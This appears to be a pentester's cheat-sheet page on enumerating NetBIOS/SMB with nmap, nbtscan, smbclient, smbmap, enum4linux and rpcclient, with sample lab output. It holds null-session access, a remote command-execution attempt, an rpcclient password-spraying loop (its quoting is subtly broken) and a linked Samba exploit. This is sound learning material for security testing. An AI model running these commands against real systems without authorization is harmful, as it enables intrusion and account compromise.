---
layout: default
title: NetBIOS / SMB
parent: Enumerating Services
grand_parent: security stuff
nav_order: 6
---


1. TOC
{:toc}


## NetBIOS / SMB
NetBIOS Services:
- NetBIOS Name Service (TCP/UDP Port 137)
- NetBIOS Datagram Service (TCP/UDP Port 138)
- NetBIOS Session Service (TCP/UDP Port 139)

SMB:
- Newer SMB uses TCP Port 445 (without the need for the NetBIOS layer)

---

### enumerate wuth nmap
```bash
# against TCP ports 139,445
nmap -vv --reason -Pn -sV -p139,445 --script="(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="unsafe=1" <target>

# same but against UDP 
nmap -vv --reason -Pn -sU -sV -p137 --script="(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" --script-args="unsafe=1" <target>
```

---

### enumerate with nbtscan
```bash
nbtscan -rvh <target>
```
- Example:
```bash
root@kali220:~# nbtscan -rvh 10.10.10.123 
Doing NBT name scan for addresses from 10.10.10.123 
NetBIOS Name Table for Host 10.10.10.123: 
Incomplete packet, 227 bytes long. 
Name             Service          Type 
---------------------------------------- 
DOMAIN       Workstation Service 
DOMAIN       Messenger Service 
DOMAIN       File Server Service 
__MSBROWSE__  Master Browser 
WORKGROUP        Domain Name 
WORKGROUP        Master Browser 
WORKGROUP        Browser Service Elections 
Adapter address: 00:00:00:00:00:00 
---------------------------------------- 
```

---

### enumerate with smbclient
```bash
# attempt null session, show shares
smbclient -L\\ -N -I <target> 

# same thing
echo exit | smbclient -L <target>

# to access a share
smbclient \\\\<target>\\share ""
```
- Example:
```bash
root@kali220:~# smbclient -L\\ -N -I 10.10.10.123 
        Sharename       Type      Comment 
        ---------       ----      ------- 
        print$          Disk      Printer Drivers 
        Files           Disk      Domain Samba Server Files /etc/Files 
        general         Disk      Domain Samba Server Files 
        Development     Disk      Domain Samba Server Files 
        PC$            IPC       IPC Service (Domain server (Samba, Ubuntu)) 
Reconnecting with SMB1 for workgroup listing. 
        Server               Comment 
        ---------            ------- 
        Workgroup            Master 
        ---------            ------- 
        WORKGROUP            DOMAIN 
```

---

### enumerate with smbmap
```bash
# show share permissions, attempt null session
# keep in mind <port> can be 139 or 445
smbmap -H <target> -P <port>
smbmap -u null -p "" <target> -P <port>

# list share contents
smbmap -H <target> -p <port> -R
smbmap -u null -p "" <target> -P <port> -R

# attempt command execution
smbmap -u null -p "" <target> -P <port> -R -x "whoami"
```
- Example:
```bash
# list share permissions
root@kali220:~# smbmap -u null -p "" -H 10.10.10.123 -P 445 
[+] Finding open SMB ports.... 
[+] Guest SMB session established on 10.10.10.123... 
[+] IP: 10.10.10.123:445        Name: domain.blue 
        Disk                                                    Permissions 
        ----                                                    ----------- 
        print$                                                  NO ACCESS 
        Files                                                   NO ACCESS 
        general                                                 READ ONLY 
        Development                                             READ, WRITE 
        IPC$                                                    NO ACCESS 
```

---

### enumerate with enum4linux
```bash
enum4linux -a -M -l -d <target> 
```

---

### enumerate with nmblookup  
```bash
# query with nmblookup (part of the samba suite of tools)
nmblookup -A $target
```

---

### enumerate with rpcclient
```bash
# attempt a null session with rpcclient
rpcclient -U "" -P $target

# rpcclient password spraying:  
for u in 'cat users.txt'; do echo -n "[*] user: $u" && rpcclient -U "$u%Password" -c "getusername;quit" $target ; done
```

---

## Resources and More
- [sambal.c](https://www.exploit-db.com/exploits/10) : able to scan for, identify and exploit samba boxes `./sambal -d 0 -C 60 -S 192.168.1.1/24`
- <https://en.wikipedia.org/wiki/NetBIOS>
- <https://en.wikipedia.org/wiki/NetBIOS_over_TCP/IP>
- <https://en.wikipedia.org/wiki/Server_Message_Block>
- <https://nmap.org/nsedoc>
- <https://labs.portcullis.co.uk/tools/enum4linux/>
- <https://www.blackhillsinfosec.com/password-spraying-other-fun-with-rpcclient/>
- <https://www.tldp.org/HOWTO/SMB-HOWTO-8.html>
